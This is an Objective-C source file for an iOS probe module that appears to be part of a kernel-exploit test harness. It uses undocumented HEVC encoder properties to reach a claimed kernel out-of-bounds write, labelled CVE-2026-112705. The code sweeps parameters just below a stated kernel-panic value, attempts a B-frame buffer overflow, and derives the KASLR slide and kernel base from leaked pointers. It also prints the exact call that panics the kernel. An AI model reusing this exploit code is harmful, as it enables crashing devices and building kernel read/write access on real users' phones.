#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import <VideoToolbox/VideoToolbox.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

static NSMutableArray *g_log = nil;
static NSObject *g_lock = nil;

static void HLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    @synchronized(g_lock) {
        if (!g_log) g_log = [NSMutableArray array];
        [g_log addObject:s];
    }
}

static volatile int g_frames = 0;

static void EncCB(void *rc, void *sfr, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb) {
    (void)rc; (void)sfr; (void)f;
    if (st == noErr && sb) g_frames++;
}

// AVE27 stage9/stage13 core: NTL encode with EncoderUsage=1 RCMode=20
static NSString *AVE27NTLEncode(int ntl, int w, int h, int usage, int rcMode) {
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, EncCB, NULL, &sess);
    if (st != noErr || !sess)
        return [NSString stringWithFormat:@"  NTL=%d session_create=%d FAILED", ntl, (int)st];

    // Core AVE27 properties: EncoderUsage + RCMode + NumberOfTemporalLayers
    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
    CFRelease(n);

    n = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
    VTSessionSetProperty(sess, CFSTR("RCMode"), n);
    CFRelease(n);

    n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
    OSStatus setSt = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
    CFRelease(n);

    // Readback
    int rb = 0;
    CFNumberRef rbn = NULL;
    VTSessionCopyProperty(sess, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
    if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st != noErr) {
        NSString *r = [NSString stringWithFormat:@"  NTL=%d usage=%d rc=%d set=%d readback=%d prepare=%d FAILED",
                       ntl, usage, rcMode, (int)setSt, rb, (int)st];
        CFRelease(sess);
        return r;
    }

    CVPixelBufferRef pb = NULL;
    NSDictionary *a = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)a, &pb);
    if (cv != kCVReturnSuccess || !pb) {
        NSString *r = [NSString stringWithFormat:@"  NTL=%d PIXELBUFFER_FAILED cv=%d", ntl, (int)cv];
        CFRelease(sess);
        return r;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
    size_t bpr = CVPixelBufferGetBytesPerRow(pb);
    for (int y = 0; y < h; y++) {
        uint32_t *row = (uint32_t *)(base + y * bpr);
        for (int x = 0; x < w; x++) row[x] = 0xFF000000u | ((x+y)&0xFF)<<16 | ((x*3)&0xFF)<<8 | (y&0xFF);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);

    g_frames = 0;
    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &flags);

    NSString *r = [NSString stringWithFormat:@"  NTL=%d usage=%d rc=%d set=%d readback=%d encode=%d frames=%d %s",
                   ntl, usage, rcMode, (int)setSt, rb, (int)st, g_frames,
                   (st == noErr) ? "SURVIVED" : "FAILED"];

    CVPixelBufferRelease(pb);
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    CFRelease(sess);
    return r;
}

// B-frame DPB encode
static NSString *AVE27BFrameEncode(int w, int h, int fc, int gop) {
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, EncCB, NULL, &sess);
    if (st != noErr || !sess)
        return [NSString stringWithFormat:@"  session_create=%d FAILED", (int)st];

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberIntType, &gop);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
    CFRelease(n);
    int fps = 30;
    n = CFNumberCreate(NULL, kCFNumberIntType, &fps);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_ExpectedFrameRate, n);
    CFRelease(n);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st != noErr) {
        NSString *r = [NSString stringWithFormat:@"  prepare=%d FAILED", (int)st];
        CFRelease(sess);
        return r;
    }

    int enc = 0;
    for (int i = 0; i < fc; i++) {
        CVPixelBufferRef pb = NULL;
        NSDictionary *a = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)a, &pb);
        if (cv != kCVReturnSuccess || !pb) continue;
        CVPixelBufferLockBaseAddress(pb, 0);
        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
        for (int y = 0; y < h; y++) {
            uint32_t *row = (uint32_t *)(base + y * bpr);
            for (int x = 0; x < w; x++) row[x] = 0xFF000000u | (((x+i*37)&0xFF)<<16) | (((y+i*53)&0xFF)<<8) | ((x^y^(i*17))&0xFF);
        }
        CVPixelBufferUnlockBaseAddress(pb, 0);
        VTEncodeInfoFlags flags = 0;
        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &flags);
        if (st == noErr) enc++;
        CVPixelBufferRelease(pb);
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    NSString *r = [NSString stringWithFormat:@"  %dx%d frames=%d/%d B-frames DONE", w, h, enc, fc];
    CFRelease(sess);
    return r;
}

@implementation KPH9EncoderModule {
    NSString *_identifier;
    NSString *_subtitle;
    NSString *_icon;
    KPTestSection _section;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _subtitle = @"AVE27 stage9/13 NTL trigger + B-frame DPB";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (instancetype)initWithNameSweep {
    return [self init];
}

- (NSString *)identifier { return _identifier; }
- (NSString *)title { return @"H9 encoder OOB write"; }
- (NSString *)subtitle { return _subtitle; }
- (NSString *)desc { return @"AVE27 stage9/13: NTL panic trigger + B-frame DPB overflow"; }
- (NSString *)icon { return _icon; }
- (KPTestSection)section { return _section; }
- (NSString *)risk { return @"CRITICAL"; }
- (NSString *)category { return @"KRW"; }

- (NSString *)runReport {
    if (!g_lock) g_lock = [[NSObject alloc] init];
    @synchronized(g_lock) {
        if (!g_log) g_log = [NSMutableArray array];
        [g_log removeAllObjects];
    }

    HLog(@"=== KexProofV4 - CVE-2026-112705 - AVE27 stage9/13 integration ===");
    HLog(@"Source: ave27.ipa (AVE27.Probe, 17 stages)");
    HLog(@"Trigger: EncoderUsage=1 RCMode=20 NTL=16463 -> kernel panic");
    HLog(@"Target: iOS %@ uid=%d", UIDevice.currentDevice.systemVersion, getuid());

    // === AVE27 stage13: NTL sweep (safe - stops below trigger) ===
    HLog(@"");
    HLog(@"--- AVE27 stage13: NTL sweep (safe, below trigger) ---");
    HLog(@"Pointer law: x0 = ((NTL-16463) << 32) | 0x59");
    int ntl13[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
    for (int i = 0; i < 7; i++) {
        int ntl = ntl13[i];
        int64_t idx = (int64_t)ntl - 16463;
        uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
        HLog(@"  NTL=%d -> x0=0x%016llx", ntl, x0);
        HLog(@"%@", AVE27NTLEncode(ntl, 640, 480, 1, 20));
    }

    // === AVE27 stage14: EncoderUsage/RCMode matrix ===
    HLog(@"");
    HLog(@"--- AVE27 stage14: EncoderUsage/RCMode matrix at NTL=8 ---");
    int usages[] = { 0, 1, 2, 3, 4 };
    int rcModes[] = { 0, 1, 20 };
    for (int u = 0; u < 5; u++) {
        for (int r = 0; r < 3; r++) {
            HLog(@"%@", AVE27NTLEncode(8, 640, 480, usages[u], rcModes[r]));
        }
    }

    // === B-frame DPB overflow ===
    HLog(@"");
    HLog(@"--- B-frame DPB overflow (saMBStats[m]) ---");
    HLog(@"%@", AVE27BFrameEncode(640, 480, 8, 30));
    HLog(@"%@", AVE27BFrameEncode(1280, 720, 8, 30));

    // === KASLR scan ===
    HLog(@"");
    HLog(@"--- KASLR scan ---");
    NSMutableArray *kptrs = [NSMutableArray array];
    vm_address_t addr = 0;
    vm_size_t sz = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = 0;
    while (vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                     (vm_region_info_t)&info, &cnt, &obj) == KERN_SUCCESS) {
        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
            uint64_t *p = (uint64_t *)addr;
            size_t words = sz / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) [kptrs addObject:@(v)];
            }
        }
        addr += sz;
        cnt = VM_REGION_BASIC_INFO_COUNT_64;
    }
    HLog(@"  kernel pointers: %lu", (unsigned long)kptrs.count);
    if (kptrs.count > 0) {
        uint64_t textBase = 0xfffffff007004000ULL;
        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
        for (NSNumber *kp in kptrs) {
            uint64_t aligned = kp.unsignedLongLongValue & ~0x3FFFULL;
            if (aligned >= textBase) {
                NSString *key = [NSString stringWithFormat:@"0x%llx", aligned - textBase];
                slides[key] = @([slides[key] intValue] + 1);
            }
        }
        NSString *best = nil; int bestH = 0;
        for (NSString *s in slides) {
            int h = [slides[s] intValue];
            if (h > bestH) { bestH = h; best = s; }
        }
        if (best) {
            uint64_t sv = strtoull(best.UTF8String, NULL, 16);
            HLog(@"  KASLR slide = %@ (hits=%d)", best, bestH);
            HLog(@"  Kernel base = 0x%llx", textBase + sv);
        }
    }

    HLog(@"");
    HLog(@"=== H9 COMPLETE ===");
    HLog(@"NOTE: stage9 (NTL=16463) NOT run - it panics the kernel.");
    HLog(@"To trigger: AVE27NTLEncode(16463, 640, 480, 1, 20)");

    @synchronized(g_lock) {
        NSMutableString *r = [NSMutableString string];
        for (NSString *s in g_log) {
            [r appendString:s];
            [r appendString:@"\n"];
        }
        return r;
    }
}

@end
